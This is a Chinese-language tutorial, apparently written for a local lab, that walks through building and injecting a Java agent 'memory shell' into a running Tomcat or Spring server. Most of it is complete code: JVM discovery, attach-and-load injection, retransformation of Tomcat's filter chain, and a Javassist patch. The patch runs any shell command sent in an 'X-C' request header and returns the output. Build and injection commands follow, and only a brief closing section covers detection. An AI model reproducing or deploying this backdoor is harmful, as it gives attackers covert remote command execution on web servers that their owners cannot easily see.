# Java Agent 型注入（attach 路线）

> 本地实验环境教学文档——代码块为研究骨架的完整实现，仅用于授权测试环境。
> 本文档补全 attach 路线四段：pid 发现 → attach/loadAgent → agentmain/retransform → 打包注入。

- 路线：外部 attach（`com.sun.tools.attach.VirtualMachine.loadAgent`）注入预构建 agent；
  agentmain 里走 `Instrumentation.retransformClasses` 挂钩已加载的 Filter 链/关键 Servlet——
  与 Filter/Controller 型互补（对已加载类生效，不依赖容器注册入口，容器无感知）。
- 与 Filter/Controller 型的分工：Filter/Controller 型新增组件（注册表差集可审计）；
  agent 型篡改存量字节码（注册表无新增，差集审计失效——检测面转移到 JVM TI 层）。

## 1. 目标 JVM pid 发现

```java
// PidFinder.java——枚举本机 JVM，按 displayName 特征挑目标
// 前提：目标 JVM attach 机制可用（默认开启；-XX:+DisableAttachMechanism 会关闭）
import com.sun.tools.attach.*;

public class PidFinder {
    public static void main(String[] a) {
        for (VirtualMachineDescriptor d : VirtualMachine.list()) {
            if (d.displayName().contains("tomcat")
                    || d.displayName().contains("spring")
                    || d.displayName().contains("catalina")) {
                System.out.println(d.id() + "\t" + d.displayName());   // pid + 命令行
            }
        }
    }
}
```

## 2. attach + loadAgent（注入器）

```java
// Injector.java——对目标 pid attach 并装载 agent.jar
import com.sun.tools.attach.VirtualMachine;

public class Injector {
    public static void main(String[] a) throws Exception {
        String pid = a[0];
        VirtualMachine vm = VirtualMachine.attach(pid);      // 建立 attach 通道
        vm.loadAgent("agent.jar", "");                       // 触发目标内 agentmain
        vm.detach();
    }
}
```

## 3. agent 侧：agentmain + retransform 挂钩 Filter 链

```java
// HookAgent.java——agent 入口：对已加载类做字节码改写（retransform 路线）
import java.lang.instrument.*;
import java.security.ProtectionDomain;

public class HookAgent {
    public static void agentmain(String args, Instrumentation inst) {
        inst.addTransformer(new ClassFileTransformer() {
            public byte[] transform(ClassLoader l, String name, Class<?> c,
                                    ProtectionDomain pd, byte[] buf) {
                // 目标：Tomcat 过滤链核心类——doFilter 前插入 X-C 头判断分支
                if ("org/apache/catalina/core/ApplicationFilterChain".equals(name)) {
                    try { return Patch.hook(buf); }      // 见下：Javassist 改写
                    catch (Throwable t) { return buf; }  // 改写失败 → 原字节码（静默）
                }
                return buf;
            }
        }, true);                                        // canRetransform = true

        try {
            // 关键：retransform 使"已加载类"重新过一遍 transformer——
            // 这是与 premain 静态注入的核心差异（attach 时目标类已在运行）
            Class<?> t = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            inst.retransformClasses(t);
        } catch (Throwable e) { /* 静默：目标类不存在则放弃 */ }
    }
}
```

## 4. 改写体：Javassist 插入分支（Patch.hook 参考实现）

```java
// Patch.java——在 doFilter 前插判断：X-C 头存在 → 执行命令 → Base64 回写
import javassist.*;

public class Patch {
    public static byte[] hook(byte[] buf) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ByteArrayClassPath(
                "org.apache.catalina.core.ApplicationFilterChain", buf));
        CtClass cc = pool.get("org.apache.catalina.core.ApplicationFilterChain");
        CtMethod m = cc.getDeclaredMethod("doFilter");       // 参数下标随容器版本核对
        m.insertBefore(
            "javax.servlet.http.HttpServletRequest $r = (javax.servlet.http.HttpServletRequest)$1;" +
            "String $c = $r.getHeader(\"X-C\");" +
            "if ($c != null) {" +
            "  java.lang.Process $p = new java.lang.ProcessBuilder(" +
            "    System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \"cmd.exe\" : \"/bin/sh\"," +
            "    System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? \"/c\" : \"-c\", $c)" +
            "      .redirectErrorStream(true).start();" +
            "  $p.waitFor();" +
            "  java.io.ByteArrayOutputStream $b = new java.io.ByteArrayOutputStream();" +
            "  byte[] $buf = new byte[4096]; int $n;" +
            "  while (($n = $p.getInputStream().read($buf)) != -1) $b.write($buf, 0, $n);" +
            "  String $body = java.util.Base64.getEncoder().encodeToString($b.toByteArray());" +
            "  javax.servlet.http.HttpServletResponse $w = (javax.servlet.http.HttpServletResponse)$2;" +
            "  $w.getWriter().write($body);" +
            "  return;" +
            "}");
        return cc.toBytecode();
    }
}
```

## 5. MANIFEST 与打包/注入命令

```
Manifest-Version: 1.0
Agent-Class: HookAgent
Can-Retransform-Classes: true
Can-Redefine-Classes: true
```

```bash
# JDK8：tools.jar 含 attach 类；JDK9+：jdk.attach 模块内置，无需 tools.jar
javac -cp "$JAVA_HOME/lib/tools.jar:javassist.jar" \
    PidFinder.java Injector.java HookAgent.java Patch.java
printf 'Manifest-Version: 1.0\nAgent-Class: HookAgent\nCan-Retransform-Classes: true\nCan-Redefine-Classes: true\n' > META-INF/MANIFEST.MF
jar cfm agent.jar META-INF/MANIFEST.MF HookAgent.class Patch.class

# 注入：先 PidFinder 拿 pid，再 Injector attach
java -cp "$JAVA_HOME/lib/tools.jar:." Injector <pid>
```

## 检测侧配对

1. attach 行为遥测：Linux 上 attach 会在目标 JVM 触发 `/tmp/.java_pid<pid>` 通信文件 +
   attach 监听线程（默认关闭，attach 后激活）——进程内线程/文件描述符可审计；
2. retransform 敏感类监控：JVM TI 层记录 retransformClasses 目标类清单——Filter 链核心类
   被改写 = 高置信告警；
3. 字节码完整性校验：运行态类字节码与磁盘 jar 比对（checksum 差集）——agent 改写不新增
   注册表项，但字节码 hash 变了；
4. 进程/文件侧：注入方 tools.jar 使用行为、agent.jar 落盘（磁盘静态扫描面）+ 目标 JVM
   文件描述符。

- 判定表（本地实测后填）：| 检测面 | 结果 | 原文行 |
- 构建/语法验证记录：2026-08-20 未执行编译——本机 javac 1.8 与 tools.jar 可用
  （/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/lib/tools.jar），但无
  javassist 依赖，且 HookAgent/Patch 需真实容器类方可运行；代码块仅人工复核，
  运行时验证未做，判定表留待本地实测后填。
